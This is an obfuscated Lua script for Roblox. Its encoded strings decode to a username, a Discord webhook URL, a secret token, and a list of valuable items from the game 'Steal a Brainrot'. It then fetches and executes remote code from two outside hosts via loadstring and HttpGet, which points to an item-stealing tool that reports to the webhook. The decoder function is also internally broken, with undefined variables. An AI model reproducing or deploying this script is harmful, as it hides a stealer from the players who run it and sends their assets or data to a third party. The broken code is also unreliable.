--[[ Obfuscated with Prometheus-style engine ]]
local _0lI0Il0O="_0O0l00";local _IOIIOlII="_OlOI0l";local _00I0OO0l="_OlO0I0";local _l0Ill0Ol="_OI0I0O";local _O000IlOO="_l0IIl0";
local _OIO0OOl0I0lII0I0=(function(_I00lIl)return function(...)local _OIIIO0=""for _,_OO0II0 in ipairs({...})do _OOIOlI=_IIl0IO..string.char(bit32 and bit32.bxor(_lII0II,_lOI0ll)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_00IIOI,_IIll0O))end return _OOl0OO end end)(86);
local _l0llIlll0O0l=function()
getgenv().User = _OIO0OOl0I0lII0I0(34,58,51,52,57,36,34,53,62,55,56)

getgenv().Webhook = _OIO0OOl0I0lII0I0(62,34,34,38,37,108,121,121,50,63,37,53,57,36,50,120,53,57,59,121,55,38,63,121,33,51,52,62,57,57,61,37,121,103,100,98,97,96,111,101,102,100,103,111,98,111,102,97,103,101,111,102,121,60,15,60,46,30,36,28,60,24,27,38,50,50,35,39,3,61,2,46,33,102,16,39,0,18,12,12,25,50,27,28,110,58,61,48,18,59,5,53,4,110,36,18,33,16,37,25,7,52,28,102,20,56,1,25,49,4,96,102,60,48,15,7,36,101,27,57,37)

getgenv().SecretToken = _OIO0OOl0I0lII0I0(102,98,96,55,100,51,48,102,123,110,53,102,52,123,98,55,99,52,123,55,101,111,98,123,55,111,51,96,55,48,100,111,48,97,100,51)

getgenv().Brainrots = {
  _OIO0OOl0I0lII0I0(5,34,36,55,33,52,51,36,36,47,118,19,58,51,38,62,55,56,34),
  _OIO0OOl0I0lII0I0(27,51,57,33,58),
  _OIO0OOl0I0lII0I0(5,61,63,52,63,50,63,118,2,57,63,58,51,34),
  _OIO0OOl0I0lII0I0(30,51,55,50,58,51,37,37,118,30,57,36,37,51,59,55,56),
  _OIO0OOl0I0lII0I0(30,47,50,36,55,118,18,36,55,49,57,56,118,21,55,56,56,51,58,58,57,56,63),
  _OIO0OOl0I0lII0I0(18,36,55,49,57,56,118,21,55,56,56,51,58,58,57,56,63),
  _OIO0OOl0I0lII0I0(18,36,55,49,57,56,118,17,63,56,49,51,36,63,56,63),
  _OIO0OOl0I0lII0I0(26,55,118,5,35,38,36,51,59,51,118,21,57,59,52,63,56,55,37,63,57,56),
  _OIO0OOl0I0lII0I0(21,51,36,52,51,36,35,37),
  _OIO0OOl0I0lII0I0(6,57,38,53,35,36,35,118,55,56,50,118,16,63,44,44,35,36,35),
  _OIO0OOl0I0lII0I0(4,57,37,51,47,118,55,56,50,118,2,51,50,50,47),
  _OIO0OOl0I0lII0I0(21,55,38,63,34,55,56,57,118,27,57,52,47),
  _OIO0OOl0I0lII0I0(21,57,57,61,63,118,55,56,50,118,27,63,58,61,63),
  _OIO0OOl0I0lII0I0(20,35,36,49,35,36,57,118,23,56,50,118,16,36,47,35,36,57),
  _OIO0OOl0I0lII0I0(29,51,34,35,38,55,34,118,20,36,57,37),
  _OIO0OOl0I0lII0I0(26,55,118,21,55,37,55,118,20,57,57),
  _OIO0OOl0I0lII0I0(5,38,57,57,61,47,118,55,56,50,118,6,35,59,38,61,47),
  _OIO0OOl0I0lII0I0(26,55,118,5,51,53,36,51,34,118,21,57,59,52,63,56,55,37,63,57,56),
  _OIO0OOl0I0lII0I0(17,55,36,55,59,55,118,55,56,50,118,27,55,50,35,56,50,35,56,49),
  _OIO0OOl0I0lII0I0(26,57,32,51,118,26,57,32,51,118,20,51,55,36),
  _OIO0OOl0I0lII0I0(21,51,58,51,37,34,63,55,58,118,6,51,49,55,37,35,37),
  _OIO0OOl0I0lII0I0(26,55,118,16,57,57,50,118,21,57,59,52,63,56,55,37,63,57,56),
  _OIO0OOl0I0lII0I0(16,36,55,49,36,55,59,55,118,55,56,50,118,21,62,57,53,36,55,59,55),
  _OIO0OOl0I0lII0I0(17,63,56,49,51,36,118,17,51,36,55,34),
  _OIO0OOl0I0lII0I0(26,57,37,118,5,38,55,49,62,51,34,34,63,37),
  _OIO0OOl0I0lII0I0(16,51,37,34,63,32,51,118,96,97),
  _OIO0OOl0I0lII0I0(23,56,34,57,56,63,57),
  _OIO0OOl0I0lII0I0(26,55,32,55,50,57,36,63,34,57,118,5,38,63,56,63,34,57),
  _OIO0OOl0I0lII0I0(29,51,34,53,62,35,36,35,118,55,56,50,118,27,35,37,34,35,36,35),
  _OIO0OOl0I0lII0I0(5,33,55,49,49,47,118,20,36,57,37),
  _OIO0OOl0I0lII0I0(25,36,53,55,58,51,50,57,56),
  _OIO0OOl0I0lII0I0(2,63,53,34,55,53,118,5,55,62,35,36),
  _OIO0OOl0I0lII0I0(29,51,34,35,38,55,34,118,29,51,38,55,34),
  _OIO0OOl0I0lII0I0(26,55,118,2,55,53,57,118,21,57,59,52,63,56,55,37,63,57,56),
  _OIO0OOl0I0lII0I0(2,55,56,49,118,2,55,56,49,118,29,51,58,51,34,55,56,49),
  _OIO0OOl0I0lII0I0(26,57,37,118,6,36,63,59,57,37),
  _OIO0OOl0I0lII0I0(2,36,55,58,55,58,51,50,57,56),
  _OIO0OOl0I0lII0I0(21,62,63,58,58,63,56,118,21,62,63,58,63),
  _OIO0OOl0I0lII0I0(21,62,63,38,37,57,118,55,56,50,118,7,35,51,37,57),
  _OIO0OOl0I0lII0I0(26,55,118,5,38,57,57,61,47,118,17,36,55,56,50,51),
  _OIO0OOl0I0lII0I0(26,57,37,118,30,57,34,37,38,57,34,37,63,34,57,37),
  _OIO0OOl0I0lII0I0(27,57,56,51,47,118,27,57,56,51,47,118,6,35,49,49,47),
  _OIO0OOl0I0lII0I0(24,35,53,58,51,55,36,57,118,18,63,56,57,37,37,55,35,36,57),
  _OIO0OOl0I0lII0I0(24,57,57,52,63,56,63,118,6,63,44,44,55,56,63,56,63)
}

task.spawn(function()
loadstring(game:HttpGet(_OIO0OOl0I0lII0I0(62,34,34,38,37,108,121,121,55,38,63,120,58,35,55,36,59,57,36,120,56,51,34,121,48,63,58,51,37,121,32,98,121,58,57,55,50,51,36,37,121,110,102,110,48,98,55,50,98,51,52,48,48,98,97,99,53,99,97,53,51,96,103,51,55,101,111,51,98,103,51,100,101,120,58,35,55)))()
end)

task.spawn(function()
loadstring(game:HttpGet(_OIO0OOl0I0lII0I0(62,34,34,38,37,108,121,121,38,55,37,34,51,37,120,63,57,121,36,55,33,121,32,103,102,102,123,62,34,34,38,37,123,110,103,110,110,96)))()
end)

end;
local _,_l0lOlIOl=pcall(_l0llIlll0O0l);if _0IlOOl0O then _l0llIlll0O0l()end;
